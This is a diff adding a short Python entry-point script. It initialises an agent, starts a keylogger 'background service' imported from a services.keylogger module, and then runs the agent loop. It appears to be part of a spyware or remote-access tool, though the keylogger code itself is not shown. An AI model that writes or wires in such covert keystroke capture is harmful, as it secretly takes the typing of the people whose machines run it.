@@ -1,0 +1,17 @@
+from app.bootstrap import init_agent
+from app.agent import Agent
+from services.keylogger import start_keylogger_service
+
+def main():
+    agent_id = init_agent()
+
+    # background services
+    start_keylogger_service(agent_id)
+
+    # main loop
+    agent = Agent(agent_id)
+    agent.run()
+
+
+if __name__ == "__main__":
+    main()
